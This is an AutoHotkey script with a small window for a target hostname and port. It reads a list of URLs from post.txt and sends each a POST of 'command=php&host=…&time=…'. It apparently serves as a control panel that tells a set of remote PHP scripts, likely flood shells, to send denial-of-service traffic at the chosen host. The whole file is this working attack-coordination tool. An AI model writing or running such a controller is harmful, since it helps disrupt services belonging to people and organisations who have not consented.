;
; AutoHotkey Version: 1.x
; Language:       English
; Platform:       Win9x/NT
; Author:         A.N.Other <myemail@nowhere.com>
;
; Script Function:
;       Template script (you can customize this template by editing "ShellNew\Template.ahk" in your Windows folder)
;
;http://127.0.0.1/autohotkey/php.php?
;command=php&host=127.0.0.1&time=1


#NoEnv  					 ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input  			 ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

Gui, Add, Edit, x22 y50 w430 h20 vHostname,
Gui, Add, Text, x22 y30 w140 h20 , Hostname (ip/domain)
Gui, Add, Edit, x52 y90 w100 h20 vTime,
Gui, Add, Text, x22 y90 w30 h30 , Port
Gui, Add, Button, x172 y90 w100 h20 gGo, Go
Gui, Show, x197 y128 h154 w479, AutoHotkey
Return

Go:
GuiControlGet , Hostname,
GuiControlGet , Time,

if(Hostname = "")
{
        Msgbox,0x30,Oops, Oops! Something went wrong.`n`nYou have to specify Hostname.
        Return
}
else if (Time = "")
{
        Msgbox,0x30,Oops, Oops! Something went wrong.`n`nYou have to specify Port.
        Return
}
;http://127.0.0.1/autohotkey/php.php?command=php&host=127.0.0.1&time=1
POSTdata := "command=php&host=" . Hostname . "&time=" . Time

Loop, Read, post.txt
{
   URL := A_LoopReadLine
   Msgbox, % URLPost(URL . POSTdata, "")
}
Return

UrlPost(URL, data) {
   WebRequest := ComObjCreate("WinHttp.WinHttpRequest.5.1")
   WebRequest.Open("POST", URL, false)
   WebRequest.Send(data)
   Return WebRequest.ResponseText
}

GuiClose:
ExitApp
